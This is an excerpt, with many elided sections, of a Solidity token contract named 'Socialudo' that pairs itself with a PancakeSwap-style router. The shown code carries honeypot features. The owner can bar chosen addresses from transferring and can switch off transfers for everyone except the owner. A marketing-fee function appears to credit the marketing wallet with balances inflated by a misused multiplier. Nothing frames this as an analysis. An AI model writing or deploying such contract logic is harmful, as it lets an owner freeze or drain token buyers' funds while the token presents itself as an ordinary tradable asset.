...
contract Socialudo is Context, IERC20, Ownable {
    ...
    string private _name = "Socialudo";
    ...
    RouterTwo public immutable LudoRouter;
    address public immutable ludoPair;
    ...
    constructor() public {
        ...
        RouterTwo _LudoRouter = RouterTwo(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        ludoPair = LudoFactory(_LudoRouter.factory()).createPair(
            address(this),
            _LudoRouter.WETH()
        );
        LudoRouter = _LudoRouter;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromMarketFee[owner()] = true;
        _isExcludedFromMarketFee[address(this)] = true;
    ...
    function isExcludedFromTransfer(address account)
        public
        view
        returns (bool)
    {
    ...
    function excludeFromTransfer(address account) public onlyOwner {
        require(
            !_isExcludedFromTransfer[account],
    ...
    function _takeMarketing(uint256 tMarketing) private {
        uint256 currentRate = _marketingFee;
        uint256 rMarketing = tMarketing.mul(currentRate);
        _rOwned[wallet] = _rOwned[wallet].add(rMarketing);
        if (_isExcluded[address(this)])
            _tOwned[wallet] = _tOwned[wallet].add(tMarketing);
    }
    ...
    function _transfer(
        ...
        require(
            _isExcludedFromTransfer[from] != true,
            "Transfer blocked from this address"
        );
        ...
        if (from != owner() && to != owner()) {
            ...
            require(transferEnabled == true, "Transfer blocked!");
        }
    ...
    function swapTokensForEth(uint256 tokenAmount) private {
        ...
        path[0] = address(this);
        path[1] = LudoRouter.WETH();
        _approve(address(this), address(LudoRouter), tokenAmount);
        LudoRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(LudoRouter), tokenAmount);
        LudoRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
